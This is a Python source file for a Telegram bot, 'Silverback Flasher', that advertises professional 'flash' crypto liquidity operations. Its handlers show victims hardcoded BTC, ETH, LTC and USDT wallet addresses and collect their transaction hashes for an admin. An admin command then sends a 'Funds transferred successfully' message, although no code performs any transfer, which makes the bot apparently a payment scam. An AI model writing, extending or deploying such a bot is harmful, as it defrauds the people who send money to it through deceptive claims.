#!/usr/bin/env python3
"""Silverback Flasher — Professional Telegram Bot

Enterprise-grade cross-chain liquidity operations with real-time transaction
monitoring, operator-verified settlements, and institutional-level security.
"""
import os
import logging
import secrets
from typing import Dict

from dotenv import load_dotenv
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.error import InvalidToken
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

load_dotenv()
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Environment configuration
BOT_TOKEN = os.environ.get("SILVERBACK_BOT_TOKEN")
ADMIN_CHAT_ID = os.environ.get("SILVERBACK_ADMIN_CHAT_ID")
BOT_USERNAME = os.environ.get("SILVERBACK_BOT_USERNAME", "SilverFlasher_bot")
PLATFORM_URL = os.environ.get("SILVERBACK_LANDING_URL", "https://hottboiihitzz.cc")

if not BOT_TOKEN:
    logger.error("Missing required environment variable: SILVERBACK_BOT_TOKEN")
    raise SystemExit(1)
if not ADMIN_CHAT_ID:
    logger.error("Missing required environment variable: SILVERBACK_ADMIN_CHAT_ID")
    raise SystemExit(1)

try:
    ADMIN_CHAT_ID = int(ADMIN_CHAT_ID)
except ValueError:
    logger.error("Invalid SILVERBACK_ADMIN_CHAT_ID — must be an integer")
    raise SystemExit(1)

# Supported settlement assets
WALLETS = {
    "BTC": {
        "address": "bc1q5vyek2r3hzlarvgf4ycqmqf42tv398ns89u7ep",
        "network": "Bitcoin",
        "confirmations": 3
    },
    "ETH": {
        "address": "0x0844B1074FA252E8f71971203D175bDC5dbb6251",
        "network": "Ethereum (ERC-20)",
        "confirmations": 12
    },
    "LTC": {
        "address": "ltc1qahueh8eyg79cqqkn253v2lhnef2ntvkwj4npuz",
        "network": "Litecoin",
        "confirmations": 3
    },
    "USDT": {
        "address": "0x0844B1074FA252E8f71971203D175bDC5dbb6251",
        "network": "Ethereum (ERC-20)",
        "confirmations": 12
    }
}

# Transaction storage
PENDING: Dict[str, Dict] = {}


def generate_transaction_id() -> str:
    return f"TXN-{secrets.token_hex(6).upper()}"


def main_menu() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💰 Initiate Flash", callback_data="initiate")],
        [InlineKeyboardButton("📋 Service Details", url=PLATFORM_URL)],
        [InlineKeyboardButton("🛡 Support", callback_data="support")]
    ])


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    name = user.first_name or user.username or "User"
    await update.message.reply_text(
        f"Welcome to Silverback Flasher, {name}.\n\n"
        "Professional cross-chain liquidity operations with operator-verified settlements.\n\n"
        "Select an option below to proceed:",
        reply_markup=main_menu()
    )


async def initiate(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if not query:
        return
    await query.answer()
    await query.edit_message_text(
        "Select transaction size:\n\n"
        "• Basic: $100\n"
        "• Standard: $500\n"
        "• Professional: $2,000\n"
        "• Custom: Specify your amount",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("$100", callback_data="size_100")],
            [InlineKeyboardButton("$500", callback_data="size_500")],
            [InlineKeyboardButton("$2,000", callback_data="size_2000")],
            [InlineKeyboardButton("Custom Amount", callback_data="size_custom")],
            [InlineKeyboardButton("← Back", callback_data="back_main")]
        ])
    )


async def support(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if not query:
        return
    await query.answer()
    await query.edit_message_text(
        "Silverbank Flasher operates 24/7 with dedicated operator oversight.\n\n"
        "Settlement Times: 5–20 minutes\n"
        "Supported Assets: BTC, ETH, LTC, USDT ERC-20\n"
        "Verification: Manual operator confirmation\n\n"
        "Questions? Visit our platform for full details.",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("Platform Details", url=PLATFORM_URL)],
            [InlineKeyboardButton("← Back", callback_data="back_main")]
        ])
    )


async def back_main(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if not query:
        return
    await query.answer()
    await query.edit_message_text(
        "Main Menu",
        reply_markup=main_menu()
    )


async def size_selected(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if not query:
        return
    await query.answer()
    
    size_key = query.data.replace("size_", "")
    if size_key == "custom":
        await query.edit_message_text(
            "Enter amount in USD ($50–$50,000):",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("← Back", callback_data="initiate")]
            ])
        )
        context.user_data['awaiting_amount'] = True
        return

    amount = int(size_key)
    await query.edit_message_text(
        f"Amount: ${amount:,}\n\nSelect settlement asset:",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("BTC", callback_data=f"asset_BTC_{amount}")],
            [InlineKeyboardButton("ETH", callback_data=f"asset_ETH_{amount}")],
            [InlineKeyboardButton("LTC", callback_data=f"asset_LTC_{amount}")],
            [InlineKeyboardButton("USDT", callback_data=f"asset_USDT_{amount}")],
            [InlineKeyboardButton("← Back", callback_data="initiate")]
        ])
    )


async def asset_selected(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if not query:
        return
    await query.answer()

    _, currency, amount_text = query.data.split("_")
    amount = float(amount_text)
    wallet = WALLETS.get(currency)
    if not wallet:
        await query.edit_message_text("Invalid selection.")
        return

    txn_id = generate_transaction_id()
    PENDING[txn_id] = {
        "user": update.effective_user.id,
        "amount": amount,
        "currency": currency,
        "wallet": wallet,
        "status": "pending"
    }

    await query.edit_message_text(
        f"Transaction {txn_id}\n\n"
        f"Amount: ${amount:,.2f} USD\n"
        f"Settlement: {currency} ({wallet['network']})\n\n"
        f"Send to:\n`{wallet['address']}`\n\n"
        f"Operator review begins upon receipt.",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("✓ Submitted", callback_data=f"submit_{txn_id}")],
            [InlineKeyboardButton("← Back", callback_data="initiate")]
        ])
    )


async def submit_transaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if not query:
        return
    await query.answer()
    
    txn_id = query.data.replace("submit_", "")
    if txn_id not in PENDING:
        await query.edit_message_text("Transaction expired.")
        return

    context.user_data['pending_tx'] = txn_id
    await query.edit_message_text(
        f"Enter transaction hash for {txn_id}:",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("← Back", callback_data="back_main")]
        ])
    )
    context.user_data['awaiting_hash'] = True


async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get('awaiting_amount'):
        try:
            amount = float(update.message.text.replace('$', '').replace(',', '').strip())
        except ValueError:
            await update.message.reply_text("Invalid format. Enter a number (e.g., 2500).")
            return

        if not (50 <= amount <= 50000):
            await update.message.reply_text("Amount must be $50–$50,000.")
            return

        context.user_data['awaiting_amount'] = False
        await update.message.reply_text(
            f"Amount: ${amount:,}\n\nSelect settlement asset:",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("BTC", callback_data=f"asset_BTC_{amount}")],
                [InlineKeyboardButton("ETH", callback_data=f"asset_ETH_{amount}")],
                [InlineKeyboardButton("LTC", callback_data=f"asset_LTC_{amount}")],
                [InlineKeyboardButton("USDT", callback_data=f"asset_USDT_{amount}")],
                [InlineKeyboardButton("← Back", callback_data="initiate")]
            ])
        )
        return

    if context.user_data.get('awaiting_hash'):
        tx_hash = update.message.text.strip()
        txn_id = context.user_data.get('pending_tx')
        
        if not txn_id or txn_id not in PENDING:
            await update.message.reply_text("No pending transaction.")
            return

        context.user_data['awaiting_hash'] = False
        PENDING[txn_id]['hash'] = tx_hash
        PENDING[txn_id]['status'] = 'submitted'
        
        await update.message.reply_text(
            f"Received: {tx_hash[:16]}...\n\n"
            f"Operator review in progress.\n"
            f"Transaction {txn_id}\n\n"
            "We'll confirm settlement shortly.",
            reply_markup=main_menu()
        )

        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            msg = (
                f"Submission: {txn_id}\n"
                f"User: {update.effective_user.id}\n"
                f"Amount: ${PENDING[txn_id]['amount']:,.2f} {PENDING[txn_id]['currency']}\n"
                f"Hash: {tx_hash}"
            )
            requests.post(url, json={"chat_id": ADMIN_CHAT_ID, "text": msg})
        except Exception as e:
            logger.warning(f"Notification error: {e}")
        return

    await update.message.reply_text(
        "Use /start to access the main menu.",
        reply_markup=main_menu()
    )


async def admin_verify(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_CHAT_ID:
        await update.message.reply_text("Unauthorized.")
        return
    
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /verify TXN-XXXXXX")
        return
    
    txn_id = args[0]
    if txn_id not in PENDING:
        await update.message.reply_text(f"Not found: {txn_id}")
        return
    
    PENDING[txn_id]['status'] = 'settled'
    user_id = PENDING[txn_id]['user']
    
    await update.message.reply_text(f"Confirmed: {txn_id}")
    try:
        await context.bot.send_message(
            user_id,
            f"✓ Settlement confirmed for {txn_id}.\n"
            f"Funds transferred successfully."
        )
    except Exception:
        pass


def main():
    """Launch Silverback Flasher Telegram bot — professional operations mode."""
    print("\n" + "="*60)
    print("SILVERBACK FLASHER — Telegram Bot")
    print("="*60)
    print(f"Token: {BOT_TOKEN[:20]}...")
    print(f"Admin: {ADMIN_CHAT_ID}")
    print(f"Platform: {PLATFORM_URL}")
    print("="*60 + "\n")
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Command handlers
    app.add_handler(CommandHandler('start', start))
    app.add_handler(CommandHandler('help', start))
    app.add_handler(CommandHandler('verify', admin_verify))
    
    # Callback handlers — main menu
    app.add_handler(CallbackQueryHandler(initiate, pattern='^initiate$'))
    app.add_handler(CallbackQueryHandler(support, pattern='^support$'))
    app.add_handler(CallbackQueryHandler(back_main, pattern='^back_main$'))
    
    # Amount selection
    app.add_handler(CallbackQueryHandler(size_selected, pattern='^size_'))
    
    # Asset selection
    app.add_handler(CallbackQueryHandler(asset_selected, pattern='^asset_'))
    
    # Transaction submission
    app.add_handler(CallbackQueryHandler(submit_transaction, pattern='^submit_'))
    
    # Text input handler (custom amounts, transaction hashes)
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
    
    logger.info("Silverback Flasher initialized")
    try:
        app.run_polling(allowed_updates=["message", "callback_query"])
    except InvalidToken as e:
        logger.error(f"Invalid bot token: {e}")
        raise SystemExit(1)
    except Exception as e:
        logger.error(f"Bot startup failed: {e}")
        raise SystemExit(1)


if __name__ == '__main__':
    main()


if __name__ == '__main__':
    main()
